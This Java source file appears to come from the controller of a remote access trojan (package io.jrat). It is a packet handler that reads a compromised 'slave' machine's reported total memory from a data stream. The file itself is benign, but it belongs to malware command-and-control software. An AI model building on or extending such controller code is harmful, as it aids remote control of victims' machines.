package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import java.io.DataInputStream;


public class Packet13InitTotalMemory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		long total = dis.readLong();
		slave.setMemory(total);
	}

}
